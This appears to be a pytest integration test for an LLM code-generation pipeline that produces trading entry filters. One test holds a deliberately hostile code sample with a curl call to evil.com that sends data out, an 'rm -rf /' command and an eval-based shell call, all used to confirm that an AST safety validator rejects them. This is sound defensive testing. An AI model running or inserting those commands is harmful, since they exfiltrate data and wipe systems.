"""Integration test: full codegen pipeline from hypothesis to registration."""

import tempfile
from pathlib import Path
from unittest.mock import patch, MagicMock

import pytest


class TestFullCodegenCycle:
    def _make_hypothesis(self) -> dict:
        """Build a realistic hypothesis from Phase 1 discovery."""
        return {
            "id": "hyp_int_001",
            "description": "ADX > 35 during London session improves SSS win rate by 15%",
            "evidence": {
                "feature_a": "adx_value",
                "feature_b": "sess_london",
                "condition": "adx_value>=0.60 AND sess_london>=0.50",
                "quadrant_win_rate": 0.52,
                "baseline_win_rate": 0.37,
                "lift": 1.41,
                "n_trades": 35,
            },
            "strategy": "sss",
            "filter_spec": {
                "name": "adx_london_session",
                "class_name": "ADXLondonSessionFilter",
                "category": "entry",
                "description": "Require ADX >= 35 during London/overlap sessions",
                "params": {
                    "adx_threshold": {"type": "float", "default": 35.0},
                    "required_sessions": {"type": "str", "default": "'london,overlap'"},
                },
                "logic_description": (
                    "Allow trades when ADX >= adx_threshold AND session is in "
                    "required_sessions. Block all other entries."
                ),
            },
        }

    def _make_llm_response(self) -> str:
        """Simulate a Claude Code CLI response with filter + test code."""
        return '''Here's the implementation:

```python
# FILE: src/edges/generated/adx_london_session.py
from src.edges.base import EdgeFilter, EdgeContext, EdgeResult


class ADXLondonSessionFilter(EdgeFilter):
    """Require ADX >= threshold during London/overlap sessions."""

    def __init__(self, config: dict) -> None:
        super().__init__("adx_london_session", config)
        params = config.get("params", {})
        self._adx_threshold = float(params.get("adx_threshold", 35.0))
        sessions_str = str(params.get("required_sessions", "london,overlap"))
        self._required_sessions = [s.strip() for s in sessions_str.split(",")]

    def should_allow(self, context: EdgeContext) -> EdgeResult:
        if not self.enabled:
            return self._disabled_result()

        in_session = context.session in self._required_sessions
        adx_ok = context.adx >= self._adx_threshold

        if not in_session:
            return EdgeResult(
                allowed=True,
                edge_name=self.name,
                reason=f"Session {context.session} not targeted -- filter inactive",
            )

        if adx_ok:
            return EdgeResult(
                allowed=True,
                edge_name=self.name,
                reason=f"ADX {context.adx:.1f} >= {self._adx_threshold:.0f} in {context.session}",
            )

        return EdgeResult(
            allowed=False,
            edge_name=self.name,
            reason=(
                f"ADX {context.adx:.1f} < {self._adx_threshold:.0f} "
                f"in {context.session} -- weak trend"
            ),
        )
```

```python
# FILE: tests/test_generated_adx_london_session.py
from datetime import datetime, timezone
import pytest
from src.edges.base import EdgeContext, EdgeResult


def _ctx(**kw):
    defaults = dict(
        timestamp=datetime(2024, 6, 15, 10, 0, tzinfo=timezone.utc),
        day_of_week=5, close_price=2350.0, high_price=2355.0,
        low_price=2345.0, spread=15.0, session="london",
        adx=30.0, atr=5.0,
    )
    defaults.update(kw)
    return EdgeContext(**defaults)


class TestADXLondonSessionFilter:
    def _make_filter(self, **kw):
        from src.edges.generated.adx_london_session import ADXLondonSessionFilter
        params = {"adx_threshold": 35.0, "required_sessions": "london,overlap"}
        params.update(kw)
        return ADXLondonSessionFilter({"enabled": True, "params": params})

    def test_allows_when_condition_met(self):
        f = self._make_filter()
        result = f.should_allow(_ctx(adx=40.0, session="london"))
        assert result.allowed is True

    def test_blocks_when_condition_violated(self):
        f = self._make_filter()
        result = f.should_allow(_ctx(adx=20.0, session="london"))
        assert result.allowed is False

    def test_disabled_passes_through(self):
        from src.edges.generated.adx_london_session import ADXLondonSessionFilter
        f = ADXLondonSessionFilter({"enabled": False, "params": {}})
        result = f.should_allow(_ctx())
        assert result.allowed is True

    def test_non_target_session_passes(self):
        f = self._make_filter()
        result = f.should_allow(_ctx(adx=20.0, session="asian"))
        assert result.allowed is True
```
'''

    def test_end_to_end_codegen_with_mocked_llm(self):
        """Full cycle: hypothesis -> LLM -> AST -> pytest -> register."""
        from src.discovery.codegen.llm_generator import generate_edge_filter, GeneratedCode
        from src.discovery.codegen.safety_pipeline import SafetyPipeline
        from src.discovery.codegen.registry import (
            register_filter, unregister_filter, list_generated_filters,
        )
        from src.edges.manager import _REGISTRY

        hypothesis = self._make_hypothesis()
        llm_response = self._make_llm_response()

        # Mock the LLM call
        mock_result = MagicMock()
        mock_result.stdout = llm_response
        mock_result.returncode = 0

        with patch("subprocess.run", return_value=mock_result):
            generated = generate_edge_filter(hypothesis)

        assert generated.filter_code is not None
        assert generated.test_code is not None
        assert "ADXLondonSessionFilter" in generated.filter_code

        # Run AST validation
        from src.discovery.codegen.ast_validator import validate_ast
        ast_result = validate_ast(generated.filter_code)
        assert ast_result.is_valid is True
        assert ast_result.class_name == "ADXLondonSessionFilter"

        # Register the filter
        filter_name = "adx_london_session"
        try:
            register_filter(
                filter_name=filter_name,
                filter_class_name="ADXLondonSessionFilter",
                filter_code=generated.filter_code,
                category="entry",
            )
            assert filter_name in _REGISTRY
            assert filter_name in list_generated_filters()

            # Verify the filter actually works
            cls, category = _REGISTRY[filter_name]
            instance = cls({"enabled": True, "params": {"adx_threshold": 35.0}})
            assert instance.name == filter_name

        finally:
            unregister_filter(filter_name)
            assert filter_name not in _REGISTRY

    def test_ast_rejects_llm_generated_dangerous_code(self):
        """Ensure the safety pipeline catches bad LLM output."""
        from src.discovery.codegen.ast_validator import validate_ast

        # Simulate LLM generating dangerous code
        bad_code = '''
import os
import subprocess
from src.edges.base import EdgeFilter, EdgeContext, EdgeResult

class DangerousFilter(EdgeFilter):
    def __init__(self, config: dict) -> None:
        super().__init__("dangerous", config)

    def should_allow(self, context: EdgeContext) -> EdgeResult:
        # Exfiltrate data
        os.system("curl http://evil.com/steal?data=" + str(context.close_price))
        subprocess.run(["rm", "-rf", "/"])
        result = eval("__import__('os').system('whoami')")
        return EdgeResult(allowed=True, edge_name=self.name, reason="pwned")
'''
        ast_result = validate_ast(bad_code)
        assert ast_result.is_valid is False
        assert len(ast_result.violations) >= 3  # os, subprocess, eval

    def test_template_renders_valid_skeleton(self):
        """Templates produce AST-valid code skeletons."""
        from src.discovery.codegen.template_renderer import render_filter_template
        from src.discovery.codegen.ast_validator import validate_ast

        hypothesis = self._make_hypothesis()
        skeleton = render_filter_template(hypothesis["filter_spec"])

        # The skeleton should pass AST validation (even though logic is NotImplementedError)
        ast_result = validate_ast(skeleton)
        assert ast_result.is_valid is True
        assert ast_result.class_name == "ADXLondonSessionFilter"
        assert ast_result.has_should_allow is True
